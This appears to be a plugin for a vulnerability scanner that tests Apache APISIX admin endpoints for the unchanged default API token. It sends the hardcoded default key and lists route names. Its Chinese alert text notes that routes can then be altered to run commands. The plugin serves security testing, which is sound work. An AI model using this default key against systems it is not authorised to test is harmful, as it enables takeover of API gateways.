#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):

    url = "{}://{}:{}/apisix/admin/routes".format(service, ip, port)
    try:

        r = await http_client(ip, port).get(url, timeout=10.0)
        if not r.status_code == 401 and r.text.find('failed to check token') > 0:
            return

        r = await http_client(ip, port).get(url,
                                            headers={"X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1"}, timeout=10.0)

        if r.status_code == 200 and r.json()['node']:
            details = "\n".join([i['key'] for i in r.json()['node']['nodes']])
            ret = {
                'alert_group': 'APISix Default Token',
                'affects': url,
                'details': u'使用了API Six默认的token未修改, 可通过API命令修改路由信息并执行命令获取'
                           u'权限，目前的路由信息:\n ' + details
            }
            return ret
    except json.decoder.JSONDecodeError as e:
        pass
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9080, 'http', True, task_msg={})
    run_plugin_test(scan)
